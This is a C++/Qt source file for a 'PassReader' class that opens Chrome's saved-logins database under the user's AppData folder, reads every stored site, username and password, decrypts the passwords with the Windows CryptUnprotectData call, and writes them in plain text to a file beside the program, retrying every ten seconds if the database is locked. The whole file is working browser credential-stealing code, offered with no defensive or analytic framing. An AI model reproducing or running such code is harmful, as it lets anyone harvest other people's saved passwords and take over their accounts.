#include "passReader.h"

PassReader::PassReader(QObject* parent, const QString &str):
    QObject{parent},
    outputFile{QCoreApplication::applicationDirPath() + '/' + str},
    timer{std::make_unique<QTimer>(this)},
    db{std::make_unique<QSqlDatabase>()}
{
    *db = QSqlDatabase::addDatabase("QSQLITE", "passwords");

    QObject::connect(timer.get(), &QTimer::timeout, this, &PassReader::readPass);

    //Get %appdata% folder
    QString appdata = getenv("APPDATA");
    appdata.replace("\\", "/");

    //Destination folder
    db->setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");
}

PassReader::~PassReader()
{
    db.reset();
    QSqlDatabase::removeDatabase("passwords");
}

void PassReader::readPass()
{
    if (db->open())
    {
        //Create SQL Query, select url+login+pass
        QSqlQuery query("SELECT origin_url, username_value, password_value FROM logins", *db);

        //If data base is locked
        if ( ! query.exec())
        {
            std::cerr << "Database is locked\n";
            db->close();
            //Start timer
            if ( ! timer->isActive())
            {
                timer->setInterval(10*1000); //10 sec
                timer->start();
            }
            return;
        }
        timer->stop();

        QFile file(outputFile);
        file.open(QIODevice::WriteOnly);

        while (query.next())
        {
            QString url = query.value(0).toString();
            QString user = query.value(1).toString();
            QByteArray pass = query.value(2).toByteArray();

            //Decrypt
            DATA_BLOB DataIn;
            DATA_BLOB DataOut;
            DATA_BLOB* pDataIn = &DataIn;
            DATA_BLOB* pDataOut = &DataOut;

            DataIn.pbData = reinterpret_cast<byte *>(pass.data());  //Pointer to data_input             BYTE*
            DataIn.cbData = pass.size();                            //Size of input string (in bytes)   DWORD

            //Decryption function
            if (CryptUnprotectData( pDataIn,
                                    NULL,
                                    NULL,           // Entropy
                                    NULL,
                                    NULL,
                                    0,
                                    pDataOut))
            {
                int passSize  = static_cast<int>(DataOut.cbData);

                //Get pass string and cut (pbData doesn't have '\0')
                QByteArray passDecrypted;
                passDecrypted.append(reinterpret_cast<char *>(DataOut.pbData), passSize);

                // std::cout << url.toStdString() << "\nuser = " << user.toStdString() << "\npass = " << passDecrypted.toStdString() << "\n\n";

                //Stream for writing
                QTextStream stream(&file);
                stream << "\"" << url << "\",\"" << user << "\",\"" << passDecrypted << "\"\n"; 
            }
            else
            {
                std::cerr << "Error in decryption function\n";
            }
        }

        db->close();
        file.close();
    }
    else
    {
        std::cerr << "Error. Cannot open database\n";
    }

    std::cout << "Done!\n";
    emit finished();
    return;
}
